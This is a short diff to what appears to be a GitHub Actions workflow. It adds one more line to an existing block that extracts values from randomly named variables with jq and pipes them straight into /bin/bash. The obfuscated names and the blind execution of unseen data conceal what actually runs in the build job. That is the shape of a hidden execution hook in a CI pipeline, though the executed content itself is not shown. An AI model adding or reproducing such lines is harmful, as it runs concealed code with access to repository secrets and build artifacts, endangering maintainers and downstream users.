@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$pke30" | jq -r .edzz03971 | /bin/bash
           echo $rbrd008 | jq -r .yuibg31274 | /bin/bash
           echo $nb60 | jq -r .bnf78 | /bin/bash
+          echo $tn63 | jq -r .hibm85 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
